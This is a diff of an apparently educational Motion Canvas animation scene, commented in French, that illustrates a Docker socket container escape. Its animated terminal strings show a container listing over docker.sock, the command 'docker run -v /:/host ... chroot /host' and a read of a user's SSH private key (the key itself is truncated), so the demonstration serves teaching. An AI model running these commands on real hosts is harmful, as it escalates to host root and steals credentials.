@@ -1,627 +1,462 @@
-import {makeScene2D} from '@motion-canvas/2d';
-import {Grid, Layout, Line, Rect, Txt} from '@motion-canvas/2d/lib/components';
+import {makeScene2D, Layout, Rect, Txt, Grid} from '@motion-canvas/2d';
 import {
-  all,
-  cancel,
   createRef,
-  easeInOutCubic,
-  easeOutCubic,
+  all,
   sequence,
   waitFor,
   waitUntil,
+  spawn,
+  cancel,
 } from '@motion-canvas/core';
-import {Terminal} from '../../components/Terminal';
+import {easeInOutCubic} from '@motion-canvas/core/lib/tweening';
+import {DiagramNode, DiagramEdge, Zone, Terminal, Packet} from '../../components';
+import {PALETTE} from '../../theme';
 
 export default makeScene2D(function* (view) {
   const vW = () => view.width();
   const vH = () => view.height();
 
-  const COLORS = {
-    bg:            '#0D1117',
-    grid:          '#21262D',
-    cream:         '#F9F9F6',
-    ghost:         '#30363D',
-    ghostText:     '#7D8590',
-    hostBg:        '#161B22',
-    hostBorder:    '#30363D',
-    containerBg:   '#0D1117',
-    safe:          '#3FB950',
-    socket:        '#FFE14D',
-    breach:        '#FF3E6C',
-  };
+  // ── Refs ──────────────────────────────────────────────────────────────────
+  const gridRef             = createRef<Grid>();
+  const titleRef            = createRef<Txt>();
+  const hostZoneRef         = createRef<Zone>();
+  const containerZoneRef    = createRef<Zone>();
+  const dockerDaemonRef     = createRef<DiagramNode>();
+  const socketFileRef       = createRef<DiagramNode>();
+  const fsEtcRef            = createRef<DiagramNode>();
+  const fsRootRef           = createRef<DiagramNode>();
+  const fsHomeRef           = createRef<DiagramNode>();
+  const fsVarRef            = createRef<DiagramNode>();
+  const ubuntuContainerRef  = createRef<DiagramNode>();
+  const escapeContainerRef  = createRef<DiagramNode>();
+  const dockerFlowPacketRef = createRef<Packet>();
+  const attackPacketRef     = createRef<Packet>();
+  const socketMountEdgeRef  = createRef<DiagramEdge>();
+  const mountEtcEdgeRef     = createRef<DiagramEdge>();
+  const mountRootEdgeRef    = createRef<DiagramEdge>();
+  const mountHomeEdgeRef    = createRef<DiagramEdge>();
+  const mountVarEdgeRef     = createRef<DiagramEdge>();
+  const terminalRef         = createRef<Terminal>();
 
-  // ─── Refs ────────────────────────────────────────────────────────────────
-  const camera         = createRef<Layout>();
-  const gridRef        = createRef<Grid>();
-  const titleRef       = createRef<Txt>();
-
-  // Hôte
-  const hostBox        = createRef<Rect>();
-  const hostLabel      = createRef<Txt>();
-
-  // Col 1 — Filesystem tree
-  const fsRoot         = createRef<Txt>();
-  const fsHome         = createRef<Txt>();
-  const fsDev          = createRef<Txt>();
-  const fsEtc          = createRef<Txt>();
-  const fsRootDir      = createRef<Txt>();
-  const fsVar          = createRef<Txt>();
-  const fsRun          = createRef<Txt>();
-  const fsSock         = createRef<Txt>();
-
-  // Col 3 — Container 1 (breached)
-  const container1Box   = createRef<Rect>();
-  const container1Label = createRef<Txt>();
-  const c1FsRoot        = createRef<Txt>();
-  const c1FsBin         = createRef<Txt>();
-  const c1FsTmp         = createRef<Txt>();
-  const c1Sock          = createRef<Txt>();   // docker.sock monté dans container 1
-  const connectLine     = createRef<Line>();  // docker.sock → container 1 (phase 3)
-  const mountCmd        = createRef<Txt>();   // flag -v en haut
-
-  // Col 3 — Container 2 (évasion)
-  const spawnArrow     = createRef<Line>();
-  const spawnLabel     = createRef<Txt>();
-  const container2Box  = createRef<Rect>();
-  const c2Title        = createRef<Txt>();
-  const c2Volume       = createRef<Txt>();
-  const c2Host         = createRef<Txt>();
-  const backArrow      = createRef<Line>();
-  const backLabel      = createRef<Txt>();
-
-  // Terminal
-  const termRef        = createRef<Terminal>();
-
-  // Caption
-  const captionRef     = createRef<Txt>();
-
-  // ═══════════════════════════════════════════════════════════════════════════
-  // SCÈNE
-  // ═══════════════════════════════════════════════════════════════════════════
+  // ── Scène ─────────────────────────────────────────────────────────────────
   view.add(
-    <Layout ref={camera} key="camera">
-      <Rect key="bg" width={'100%'} height={'100%'} fill={COLORS.bg} zIndex={-2} />
+    <Layout key="root" width={'100%'} height={'100%'}>
+      <Rect key="bg" width={'100%'} height={'100%'} fill={PALETTE.bg} />
+
+      {/* — Grille de fond — */}
       <Grid
+        key="bg-grid"
         ref={gridRef}
-        key="grid"
         width={'100%'}
         height={'100%'}
-        stroke={COLORS.grid}
+        spacing={() => vW() * 0.04}
+        stroke={PALETTE.cream + '15'}
         lineWidth={1}
-        spacing={() => vW() * 0.031}
         opacity={0}
-        zIndex={-1}
       />
 
-      {/* Titre */}
+      {/* — Titre — */}
       <Txt
+        key="scene-title"
         ref={titleRef}
-        key="title"
-        text="DOCKER SOCKET ESCAPE"
-        fill={COLORS.breach}
-        fontSize={() => vW() * 0.026}
-        fontWeight={800}
-        fontFamily={'Space Grotesk'}
-        y={() => vH() * -0.435}
-        opacity={0}
-      />
-
-      {/* ── Hôte Linux ────────────────────────────────────────────────────── */}
-      <Rect
-        ref={hostBox}
-        key="host-box"
-        x={0}
-        y={() => vH() * -0.015}
-        width={() => vW() * 0.900}
-        height={() => vH() * 0.740}
-        fill={COLORS.hostBg}
-        stroke={COLORS.hostBorder}
-        lineWidth={2}
-        radius={() => vW() * 0.008}
-        opacity={0}
-      />
-      <Txt
-        ref={hostLabel}
-        key="host-label"
-        text="Hôte Linux"
-        fill={COLORS.ghostText}
-        fontSize={() => vW() * 0.013}
-        fontFamily={'Space Grotesk'}
-        fontWeight={600}
-        x={() => vW() * -0.395}
-        y={() => vH() * -0.360}
-        opacity={0}
-      />
-
-      {/* ── Col 1 : Filesystem ────────────────────────────────────────────── */}
-      <Txt
-        ref={fsRoot}
-        key="fs-root"
-        text="/"
-        fill={COLORS.cream}
-        fontSize={() => vW() * 0.018}
-        fontFamily={'DM Mono, monospace'}
+        text="docker.sock escape"
+        fill={PALETTE.rose}
+        fontSize={() => vW() * 0.022}
+        fontFamily={'Space Grotesk, DM Sans, sans-serif'}
         fontWeight={700}
-        x={() => vW() * -0.348}
-        y={() => vH() * -0.285}
+        x={0}
+        y={() => vH() * -0.46}
         opacity={0}
       />
-      <Txt
-        ref={fsHome}
-        key="fs-home"
-        text="├── /home"
-        fill={COLORS.ghostText}
-        fontSize={() => vW() * 0.014}
-        fontFamily={'DM Mono, monospace'}
-        x={() => vW() * -0.329}
-        y={() => vH() * -0.228}
+
+      {/* — Zones — */}
+      <Zone
+        key="host-zone"
+        ref={hostZoneRef}
+        preset="trusted"
+        label="HOST"
+        width={() => vW() * 0.38}
+        height={() => vH() * 0.62}
+        x={() => vW() * -0.28}
+        y={() => vH() * -0.08}
         opacity={0}
       />
-      <Txt
-        ref={fsDev}
-        key="fs-dev"
-        text="├── /dev"
-        fill={COLORS.ghostText}
-        fontSize={() => vW() * 0.014}
-        fontFamily={'DM Mono, monospace'}
-        x={() => vW() * -0.329}
-        y={() => vH() * -0.183}
+      <Zone
+        key="container-zone"
+        ref={containerZoneRef}
+        preset="sandbox"
+        label="CONTAINER"
+        width={() => vW() * 0.36}
+        height={() => vH() * 0.62}
+        x={() => vW() * 0.30}
+        y={() => vH() * -0.08}
         opacity={0}
       />
-      <Txt
-        ref={fsEtc}
+
+      {/* — Docker Daemon — à l'interface entre les deux zones — */}
+      <DiagramNode
+        key="docker-daemon"
+        ref={dockerDaemonRef}
+        preset="server"
+        iconName="logos:docker-icon"
+        label="Docker Daemon"
+        sublabel="dockerd"
+        color={PALETTE.cyan}
+        width={() => vW() * 0.155}
+        height={() => vH() * 0.18}
+        x={0}
+        y={() => vH() * -0.30}
+        opacity={0}
+      />
+
+      {/* — docker.sock — plus petit, dans la zone host — */}
+      <DiagramNode
+        key="socket-file"
+        ref={socketFileRef}
+        preset="file"
+        label="docker.sock"
+        sublabel="unix socket"
+        color={PALETTE.secondary}
+        width={() => vW() * 0.115}
+        height={() => vH() * 0.088}
+        x={() => vW() * -0.28}
+        y={() => vH() * -0.11}
+        opacity={0}
+      />
+
+      {/* — Filesystem host — grille 2×2 dans la zone host — */}
+      <DiagramNode
         key="fs-etc"
-        text="├── /etc"
-        fill={COLORS.ghostText}
-        fontSize={() => vW() * 0.014}
-        fontFamily={'DM Mono, monospace'}
-        x={() => vW() * -0.329}
-        y={() => vH() * -0.138}
+        ref={fsEtcRef}
+        preset="file"
+        iconName="mdi:folder-cog-outline"
+        label="/etc"
+        color={PALETTE.cream}
+        width={() => vW() * 0.105}
+        height={() => vH() * 0.085}
+        x={() => vW() * -0.36}
+        y={() => vH() * 0.03}
         opacity={0}
       />
-      <Txt
-        ref={fsRootDir}
-        key="fs-root-dir"
-        text="├── /root"
-        fill={COLORS.ghostText}
-        fontSize={() => vW() * 0.014}
-        fontFamily={'DM Mono, monospace'}
-        x={() => vW() * -0.329}
-        y={() => vH() * -0.093}
+      <DiagramNode
+        key="fs-root"
+        ref={fsRootRef}
+        preset="file"
+        iconName="mdi:folder-account-outline"
+        label="/root"
+        color={PALETTE.cream}
+        width={() => vW() * 0.105}
+        height={() => vH() * 0.085}
+        x={() => vW() * -0.21}
+        y={() => vH() * 0.03}
         opacity={0}
       />
-      <Txt
-        ref={fsVar}
+      <DiagramNode
+        key="fs-home"
+        ref={fsHomeRef}
+        preset="file"
+        iconName="mdi:home-outline"
+        label="/home"
+        color={PALETTE.cream}
+        width={() => vW() * 0.105}
+        height={() => vH() * 0.085}
+        x={() => vW() * -0.36}
+        y={() => vH() * 0.14}
+        opacity={0}
+      />
+      <DiagramNode
         key="fs-var"
-        text="└── /var"
-        fill={COLORS.ghostText}
-        fontSize={() => vW() * 0.014}
-        fontFamily={'DM Mono, monospace'}
-        x={() => vW() * -0.329}
-        y={() => vH() * -0.048}
-        opacity={0}
-      />
-      <Txt
-        ref={fsRun}
-        key="fs-run"
-        text="    └── /run"
-        fill={COLORS.ghostText}
-        fontSize={() => vW() * 0.014}
-        fontFamily={'DM Mono, monospace'}
-        x={() => vW() * -0.313}
-        y={() => vH() * -0.003}
-        opacity={0}
-      />
-      <Txt
-        ref={fsSock}
-        key="fs-sock"
-        text="        └── docker.sock"
-        fill={COLORS.socket}
-        fontSize={() => vW() * 0.014}
-        fontFamily={'DM Mono, monospace'}
-        fontWeight={700}
-        x={() => vW() * -0.297}
-        y={() => vH() * 0.042}
+        ref={fsVarRef}
+        preset="file"
+        iconName="mdi:database-outline"
+        label="/var"
+        color={PALETTE.cream}
+        width={() => vW() * 0.105}
+        height={() => vH() * 0.085}
+        x={() => vW() * -0.21}
+        y={() => vH() * 0.14}
         opacity={0}
       />
 
-      {/* Ligne directe docker.sock → Container 1 (L-shape, phase 3) */}
-      <Line
-        ref={connectLine}
-        key="connect-line"
-        points={() => [
-          [vW() * -0.115, vH() * 0.042],
-          [vW() * 0.185,  vH() * 0.042],
-          [vW() * 0.185,  vH() * -0.005],
-        ]}
-        stroke={COLORS.socket}
-        lineWidth={3}
-        endArrow
-        arrowSize={12}
+      {/* — Ubuntu (docker.sock monté) — dans la zone container — */}
+      <DiagramNode
+        key="ubuntu-container"
+        ref={ubuntuContainerRef}
+        preset="container"
+        iconName="devicon:ubuntu"
+        label="ubuntu"
+        sublabel="-v docker.sock"
+        color={PALETTE.rose}
+        initialState="error"
+        width={() => vW() * 0.14}
+        height={() => vH() * 0.165}
+        x={() => vW() * 0.30}
+        y={() => vH() * -0.27}
         opacity={0}
+      />
+
+      {/* — Escape container — spawné pendant l'attaque — */}
+      <DiagramNode
+        key="escape-container"
+        ref={escapeContainerRef}
+        preset="container"
+        iconName="devicon:ubuntu"
+        label="ubuntu"
+        sublabel="-v /:/host"
+        color={PALETTE.rose}
+        initialState="error"
+        width={() => vW() * 0.14}
+        height={() => vH() * 0.13}
+        x={() => vW() * 0.30}
+        y={() => vH() * -0.03}
+        opacity={0}
+      />
+
+      {/* — Packets — */}
+      <Packet
+        key="docker-flow-packet"
+        ref={dockerFlowPacketRef}
+        content="API"
+        color={PALETTE.cyan}
+        packetSize="sm"
+        width={() => vW() * 0.065}
+        height={() => vH() * 0.038}
+        opacity={0}
+      />
+      <Packet
+        key="attack-packet"
+        ref={attackPacketRef}
+        content="docker run"
+        color={PALETTE.rose}
+        packetSize="sm"
+        width={() => vW() * 0.09}
+        height={() => vH() * 0.038}
+        opacity={0}
+      />
+
+      {/* — Socket mount edge — docker.sock → ubuntu container — */}
+      <DiagramEdge
+        key="socket-mount-edge"
+        ref={socketMountEdgeRef}
+        from={() => [vW() * -0.222, vH() * -0.11]}
+        to={() =>   [vW() *  0.228, vH() * -0.27]}
+        edgeDirection="uni"
+        edgeStyle="dashed"
+        label="unix socket"
+        stroke={PALETTE.rose}
         end={0}
-      />
-
-      {/* Flag -v (phase 3) */}
-      <Txt
-        ref={mountCmd}
-        key="mount-cmd"
-        text="-v /var/run/docker.sock:/var/run/docker.sock"
-        fill={COLORS.socket}
-        fontSize={() => vW() * 0.015}
-        fontFamily={'DM Mono, monospace'}
-        fontWeight={700}
-        y={() => vH() * -0.388}
         opacity={0}
       />
 
-      {/* ── Col 3 top : Container 1 ───────────────────────────────────────── */}
-      <Txt
-        ref={container1Label}
-        key="c1-label"
-        text="Container ubuntu"
-        fill={COLORS.safe}
-        fontSize={() => vW() * 0.013}
-        fontWeight={700}
-        fontFamily={'Space Grotesk'}
-        x={() => vW() * 0.295}
-        y={() => vH() * -0.278}
-        opacity={0}
-      />
-      <Rect
-        ref={container1Box}
-        key="c1-box"
-        x={() => vW() * 0.295}
-        y={() => vH() * -0.130}
-        width={() => vW() * 0.220}
-        height={() => vH() * 0.270}
-        fill={COLORS.containerBg}
-        stroke={COLORS.safe}
-        lineWidth={3}
-        radius={() => vW() * 0.007}
-        opacity={0}
-        shadowColor={COLORS.safe}
-        shadowBlur={() => vW() * 0.010}
-      />
-
-      {/* Mini-FS dans container 1 */}
-      <Txt
-        ref={c1FsRoot}
-        key="c1-fs-root"
-        text="/"
-        fill={COLORS.cream}
-        fontSize={() => vW() * 0.015}
-        fontFamily={'DM Mono, monospace'}
-        fontWeight={700}
-        x={() => vW() * 0.235}
-        y={() => vH() * -0.215}
-        opacity={0}
-      />
-      <Txt
-        ref={c1FsBin}
-        key="c1-fs-bin"
-        text="├── /bin"
-        fill={COLORS.ghostText}
-        fontSize={() => vW() * 0.012}
-        fontFamily={'DM Mono, monospace'}
-        x={() => vW() * 0.248}
-        y={() => vH() * -0.165}
-        opacity={0}
-      />
-      <Txt
-        ref={c1FsTmp}
-        key="c1-fs-tmp"
-        text="└── /tmp"
-        fill={COLORS.ghostText}
-        fontSize={() => vW() * 0.012}
-        fontFamily={'DM Mono, monospace'}
-        x={() => vW() * 0.248}
-        y={() => vH() * -0.118}
-        opacity={0}
-      />
-
-      {/* docker.sock à l'intérieur du container 1 (phase 3) */}
-      <Txt
-        ref={c1Sock}
-        key="c1-sock"
-        text="└── docker.sock"
-        fill={COLORS.socket}
-        fontSize={() => vW() * 0.012}
-        fontFamily={'DM Mono, monospace'}
-        fontWeight={700}
-        x={() => vW() * 0.248}
-        y={() => vH() * -0.060}
-        opacity={0}
-      />
-
-      {/* ── Col 3 bottom : Container 2 (évasion) ─────────────────────────── */}
-
-      {/* Flèche spawn : container 1 → container 2 */}
-      <Line
-        ref={spawnArrow}
-        key="spawn-arrow"
-        points={() => [
-          [vW() * 0.295, vH() * -0.005],
-          [vW() * 0.295, vH() * 0.095],
-        ]}
-        stroke={COLORS.breach}
-        lineWidth={3}
-        endArrow
-        arrowSize={12}
-        opacity={0}
+      {/* — Mount edges — escape container → nœuds filesystem — */}
+      <DiagramEdge
+        key="mount-etc-edge"
+        ref={mountEtcEdgeRef}
+        from={() => [vW() * 0.228, vH() * -0.04]}
+        to={() =>   [vW() * -0.36, vH() *  0.03]}
+        edgeDirection="uni"
+        edgeStyle="animated"
+        stroke={PALETTE.rose}
         end={0}
-      />
-      <Txt
-        ref={spawnLabel}
-        key="spawn-label"
-        text="docker run"
-        fill={COLORS.breach}
-        fontSize={() => vW() * 0.011}
-        fontFamily={'DM Mono, monospace'}
-        x={() => vW() * 0.360}
-        y={() => vH() * 0.045}
         opacity={0}
       />
-
-      <Txt
-        ref={c2Title}
-        key="c2-title"
-        text="Nouveau container ubuntu"
-        fill={COLORS.breach}
-        fontSize={() => vW() * 0.013}
-        fontWeight={700}
-        fontFamily={'Space Grotesk'}
-        x={() => vW() * 0.215}
-        y={() => vH() * 0.088}
-        opacity={0}
-      />
-      <Rect
-        ref={container2Box}
-        key="c2-box"
-        x={() => vW() * 0.295}
-        y={() => vH() * 0.200}
-        width={() => vW() * 0.280}
-        height={() => vH() * 0.195}
-        fill={'#FF3E6C08'}
-        stroke={COLORS.breach}
-        lineWidth={3}
-        radius={() => vW() * 0.007}
-        opacity={0}
-        shadowColor={COLORS.breach}
-        shadowBlur={() => vW() * 0.015}
-      />
-      <Txt
-        ref={c2Volume}
-        key="c2-volume"
-        text="-v /:/host"
-        fill={COLORS.socket}
-        fontSize={() => vW() * 0.016}
-        fontFamily={'DM Mono, monospace'}
-        fontWeight={700}
-        x={() => vW() * 0.295}
-        y={() => vH() * 0.175}
-        opacity={0}
-      />
-      <Txt
-        ref={c2Host}
-        key="c2-host"
-        text="/host → /"
-        fill={COLORS.ghostText}
-        fontSize={() => vW() * 0.013}
-        fontFamily={'DM Mono, monospace'}
-        x={() => vW() * 0.295}
-        y={() => vH() * 0.225}
-        opacity={0}
-      />
-
-      {/* Flèche retour : container 2 → FS tree root (L-shape dashed) */}
-      <Line
-        ref={backArrow}
-        key="back-arrow"
-        points={() => [
-          [vW() * 0.155,  vH() * 0.200],
-          [vW() * -0.200, vH() * 0.200],
-          [vW() * -0.348, vH() * -0.285],
-        ]}
-        stroke={COLORS.breach}
-        lineWidth={2}
-        lineDash={[6, 4]}
-        endArrow
-        arrowSize={10}
-        opacity={0}
+      <DiagramEdge
+        key="mount-root-edge"
+        ref={mountRootEdgeRef}
+        from={() => [vW() * 0.228, vH() * -0.04]}
+        to={() =>   [vW() * -0.21, vH() *  0.03]}
+        edgeDirection="uni"
+        edgeStyle="animated"
+        stroke={PALETTE.rose}
         end={0}
+        opacity={0}
       />
-      <Txt
-        ref={backLabel}
-        key="back-label"
-        text="accède au FS hôte"
-        fill={COLORS.breach}
-        fontSize={() => vW() * 0.011}
-        fontFamily={'Space Grotesk'}
-        x={() => vW() * -0.050}
-        y={() => vH() * 0.183}
+      <DiagramEdge
+        key="mount-home-edge"
+        ref={mountHomeEdgeRef}
+        from={() => [vW() * 0.228, vH() * -0.02]}
+        to={() =>   [vW() * -0.36, vH() *  0.14]}
+        edgeDirection="uni"
+        edgeStyle="animated"
+        stroke={PALETTE.rose}
+        end={0}
+        opacity={0}
+      />
+      <DiagramEdge
+        key="mount-var-edge"
+        ref={mountVarEdgeRef}
+        from={() => [vW() * 0.228, vH() * -0.02]}
+        to={() =>   [vW() * -0.21, vH() *  0.14]}
+        edgeDirection="uni"
+        edgeStyle="animated"
+        stroke={PALETTE.rose}
+        end={0}
         opacity={0}
       />
 
-      {/* ── Terminal ──────────────────────────────────────────────────────── */}
+      {/* — Terminal — */}
       <Terminal
-        ref={termRef}
         key="terminal"
-        title="root@container:/# bash"
-        fontSize={() => vW() * 0.014}
-        width={() => vW() * 0.780}
-        height={() => vH() * 0.290}
-        maxLines={8}
+        ref={terminalRef}
+        title="root@ubuntu — bash"
+        fontSize={() => vW() * 0.013}
+        width={() => vW() * 0.88}
+        height={() => vH() * 0.28}
         x={0}
-        y={() => vH() * 0.370}
+        y={() => vH() * 0.35}
+        maxLines={6}
         opacity={0}
-        zIndex={10}
-        stroke={COLORS.breach}
       />
-
-      {/* ── Caption ───────────────────────────────────────────────────────── */}
-      <Txt
-        ref={captionRef}
-        key="caption"
-        text=""
-        fill={COLORS.cream}
-        fontSize={() => vW() * 0.015}
-        fontFamily={'Space Grotesk'}
-        y={() => vH() * 0.435}
-        opacity={0}
-        textAlign={'center'}
-      />
-    </Layout>,
+    </Layout>
   );
 
-  // ═══════════════════════════════════════════════════════════════════════════
-  // ANIMATIONS
-  // ═══════════════════════════════════════════════════════════════════════════
-
-  // ─── Phase 1 : Hôte + FS ─────────────────────────────────────────────────
-  yield* waitUntil('setupHost');
-
+  // ── Phase 1 — Setup: hôte + daemon + filesystem ───────────────────────────
+  yield* waitUntil('showHost');
   yield* all(
-    gridRef().opacity(0.4, 0.8),
-    titleRef().opacity(1, 0.6),
+    gridRef().opacity(0.12, 0.6),
+    titleRef().opacity(1, 0.5),
+    hostZoneRef().opacity(1, 0.4),
+    sequence(0.15,
+      dockerDaemonRef().opacity(1, 0.3),
+      socketFileRef().opacity(1, 0.3),
+      sequence(0.07,
+        fsEtcRef().opacity(1, 0.25),
+        fsRootRef().opacity(1, 0.25),
+        fsHomeRef().opacity(1, 0.25),
+        fsVarRef().opacity(1, 0.25),
+      ),
+    ),
   );
-  yield* waitFor(0.2);
 
-  yield* all(
-    hostBox().opacity(1, 0.5),
-    hostLabel().opacity(1, 0.5),
-  );
-  yield* waitFor(0.3);
-
-  // FS tree apparaît nœud par nœud
-  yield* fsRoot().opacity(1, 0.35);
-  yield* sequence(0.06,
-    fsHome().opacity(1, 0.28),
-    fsDev().opacity(1, 0.28),
-    fsEtc().opacity(1, 0.28),
-    fsRootDir().opacity(1, 0.28),
-    fsVar().opacity(1, 0.28),
-    fsRun().opacity(1, 0.28),
-    fsSock().opacity(1, 0.40),
-  );
-  yield* waitFor(0.8);
-
-  // ─── Phase 2 : Container 1 isolé ─────────────────────────────────────────
+  // ── Phase 2 — Zone container (vide) ──────────────────────────────────────
   yield* waitUntil('showContainer');
+  yield* containerZoneRef().opacity(1, 0.4);
 
+  // ── Phase 3 — Flux Docker légitime : socket → daemon → ubuntu ────────────
+  // Montre comment dockerd instancie un container via docker.sock
+  yield* waitUntil('showDockerFlow');
+
+  dockerFlowPacketRef().position([vW() * -0.28, vH() * -0.11]);
+  yield* dockerFlowPacketRef().opacity(1, 0.15);
+  yield* dockerFlowPacketRef().flyTo([0, vH() * -0.30], 0.5);
+  yield* waitFor(0.08);
+  yield* dockerFlowPacketRef().flyTo([vW() * 0.30, vH() * -0.27], 0.45);
   yield* all(
-    container1Box().opacity(1, 0.5),
-    container1Label().opacity(1, 0.5),
-  );
-  yield* sequence(0.1,
-    c1FsRoot().opacity(1, 0.28),
-    c1FsBin().opacity(1, 0.25),
-    c1FsTmp().opacity(1, 0.25),
+    dockerFlowPacketRef().opacity(0, 0.15),
+    ubuntuContainerRef().opacity(1, 0.35),
   );
 
-  captionRef().text('Namespace actif — le container est isolé');
-  yield* captionRef().opacity(1, 0.4);
-  yield* waitFor(1.2);
-  yield* captionRef().opacity(0, 0.3);
+  // Edge tiretée : docker.sock → ubuntu (mount persistant visible)
+  socketMountEdgeRef().opacity(1);
+  yield* socketMountEdgeRef().end(1, 0.4, easeInOutCubic);
 
-  // ─── Phase 3 : Montage du socket ─────────────────────────────────────────
-  yield* waitUntil('mountSocket');
+  // ── Phase 4 — Attaque : ubuntu → socket → daemon → escape container ───────
+  yield* waitUntil('showAttack');
+  yield* terminalRef().opacity(1, 0.4);
 
-  yield* mountCmd().opacity(1, 0.5);
-  yield* waitFor(0.4);
+  const blinkTask = yield terminalRef().startBlink();
 
-  // Flèche docker.sock → Container 1 se dessine
-  connectLine().opacity(1);
-  yield* connectLine().end(1, 0.55, easeInOutCubic);
-
-  // Container 1 vire au rouge
-  yield* all(
-    container1Box().stroke(COLORS.breach, 0.4),
-    container1Box().shadowColor(COLORS.breach, 0.4),
-    container1Label().fill(COLORS.breach, 0.4),
-  );
-
-  // docker.sock apparaît dans container 1
-  yield* c1Sock().opacity(1, 0.4);
-
-  captionRef().text('L\'API Docker est maintenant accessible depuis l\'intérieur du container');
-  yield* captionRef().opacity(1, 0.4);
-  yield* waitFor(1.4);
-  yield* captionRef().opacity(0, 0.3);
-
-  // ─── Phase 4 : Terminal ───────────────────────────────────────────────────
-  yield* waitUntil('showTerminal');
-
-  yield* all(
-    camera().position([0, -vH() * 0.168], 0.6, easeInOutCubic),
-    termRef().opacity(1, 0.5),
-  );
-
-  const blink = yield termRef().startBlink();
-
-  yield* termRef().typewrite(
-    "curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | jq '.[].Names'",
-    {prompt: true, charDelay: 0.022, color: 'cream'},
-  );
-  yield* waitFor(0.3);
-  yield* termRef().typewrite('["webapp","db","redis","monitoring"]', {color: 'vert'});
-  yield* waitFor(0.7);
-
-  yield* termRef().typewrite('apt install -y docker.io', {prompt: true, charDelay: 0.038});
-  yield* waitFor(0.2);
-  yield* termRef().typewrite('Unpacking docker.io (24.0.7) ... done', {color: 'ghost'});
-  yield* waitFor(0.5);
-
-  yield* termRef().typewrite(
+  yield* waitUntil('attackCommand');
+  yield* terminalRef().typewrite(
     'docker run -v /:/host -it ubuntu chroot /host',
-    {prompt: true, charDelay: 0.042, color: 'jaune'},
+    {prompt: true, charDelay: 0.032},
+  );
+  cancel(blinkTask);
+
+  // Packet trace le chemin complet : ubuntu → socket → daemon → escape
+  attackPacketRef().position([vW() * 0.30, vH() * -0.27]);
+  yield* attackPacketRef().opacity(1, 0.15);
+  yield* attackPacketRef().flyTo([vW() * -0.28, vH() * -0.11], 0.55);
+  yield* waitFor(0.07);
+  yield* attackPacketRef().flyTo([0, vH() * -0.30], 0.45);
+  yield* waitFor(0.07);
+  yield* attackPacketRef().flyTo([vW() * 0.30, vH() * -0.03], 0.45);
+  yield* all(
+    attackPacketRef().opacity(0, 0.15),
+    escapeContainerRef().opacity(1, 0.35),
   );
 
-  cancel(blink);
-  yield* termRef().hideCursor();
-  yield* waitFor(0.7);
+  // ── Phase 5 — Mount : escape container → filesystem ─────────────────────
+  yield* waitUntil('showMount');
 
-  // ─── Phase 5 : Évasion ───────────────────────────────────────────────────
-  yield* waitUntil('escape');
-
+  // Toutes les flèches de mount se tracent simultanément
+  mountEtcEdgeRef().opacity(1);
+  mountRootEdgeRef().opacity(1);
+  mountHomeEdgeRef().opacity(1);
+  mountVarEdgeRef().opacity(1);
   yield* all(
-    camera().position([0, 0], 0.6, easeInOutCubic),
-    termRef().opacity(0, 0.4),
+    mountEtcEdgeRef().end(1, 0.55, easeInOutCubic),
+    mountRootEdgeRef().end(1, 0.55, easeInOutCubic),
+    mountHomeEdgeRef().end(1, 0.55, easeInOutCubic),
+    mountVarEdgeRef().end(1, 0.55, easeInOutCubic),
   );
 
-  // Flèche spawn + container 2 apparaît
-  spawnArrow().opacity(1);
+  spawn(mountEtcEdgeRef().animateDash());
+  spawn(mountRootEdgeRef().animateDash());
+  spawn(mountHomeEdgeRef().animateDash());
+  spawn(mountVarEdgeRef().animateDash());
+
+  // Zone host + tous les nœuds passent en état "error"
   yield* all(
-    spawnArrow().end(1, 0.4, easeOutCubic),
-    spawnLabel().opacity(1, 0.4),
+    hostZoneRef().fill(PALETTE.rose + '1A', 0.4),
+    hostZoneRef().stroke(PALETTE.rose + 'CC', 0.4),
+    dockerDaemonRef().setState('error', 0.15),
+    socketFileRef().setState('error', 0.15),
+    fsEtcRef().setState('error', 0.2),
+    fsRootRef().setState('error', 0.2),
+    fsHomeRef().setState('error', 0.2),
+    fsVarRef().setState('error', 0.2),
   );
-  yield* waitFor(0.1);
 
-  yield* c2Title().opacity(1, 0.35);
-  yield* container2Box().opacity(1, 0.45);
-  yield* all(
-    c2Volume().opacity(1, 0.35),
-    c2Host().opacity(1, 0.35),
+  yield* waitUntil('attackOutput');
+  const finalBlinkTask = yield terminalRef().startBlink();
+  yield* terminalRef().typewrite('# id', {prompt: true, charDelay: 0.06});
+  yield* terminalRef().typewrite(
+    "uid=0(root) gid=0(root)  ← root sur l'hôte",
+    {color: 'rose'},
   );
-  yield* waitFor(0.3);
 
-  // Flèche retour vers FS hôte
-  backArrow().opacity(1);
-  backLabel().opacity(1);
-  yield* backArrow().end(1, 0.7, easeInOutCubic);
+  yield* waitUntil('catCommand');
+  yield* terminalRef().typewrite(
+    'cat /host/home/alex/.ssh/id_rsa',
+    {prompt: true, charDelay: 0.04},
+  );
+  yield* terminalRef().typewrite(
+    '-----BEGIN OPENSSH PRIVATE KEY-----',
+    {color: 'danger'},
+  );
+  yield* terminalRef().typewrite(
+    'b3BlbnNzaC1rZXktdjEAAAAA [...] AAAAB3NzaC1yc2EAAA==',
+    {color: 'danger'},
+  );
+  yield* terminalRef().typewrite(
+    '-----END OPENSSH PRIVATE KEY-----',
+    {color: 'danger'},
+  );
+  cancel(finalBlinkTask);
 
-  captionRef().text("Il n'a pas sauté la clôture — il a demandé poliment à Docker d'en ouvrir une.");
-  yield* captionRef().opacity(1, 0.5);
+  yield* waitFor(1.5);
 
-  yield* waitFor(2.5);
-
-  // ─── Fin ─────────────────────────────────────────────────────────────────
-  yield* waitUntil('endScene');
-
+  // ── Fin ───────────────────────────────────────────────────────────────────
+  yield* waitUntil('end');
   yield* all(
-    gridRef().opacity(0, 0.6),
-    titleRef().opacity(0, 0.6),
-    hostBox().opacity(0, 0.6),
-    captionRef().opacity(0, 0.5),
+    gridRef().opacity(0, 0.4),
+    titleRef().opacity(0, 0.3),
+    hostZoneRef().opacity(0, 0.4),
+    containerZoneRef().opacity(0, 0.4),
+    dockerDaemonRef().opacity(0, 0.3),
+    socketFileRef().opacity(0, 0.3),
+    fsEtcRef().opacity(0, 0.25),
+    fsRootRef().opacity(0, 0.25),
+    fsHomeRef().opacity(0, 0.25),
+    fsVarRef().opacity(0, 0.25),
+    ubuntuContainerRef().opacity(0, 0.3),
+    escapeContainerRef().opacity(0, 0.3),
+    socketMountEdgeRef().opacity(0, 0.3),
+    mountEtcEdgeRef().opacity(0, 0.3),
+    mountRootEdgeRef().opacity(0, 0.3),
+    mountHomeEdgeRef().opacity(0, 0.3),
+    mountVarEdgeRef().opacity(0, 0.3),
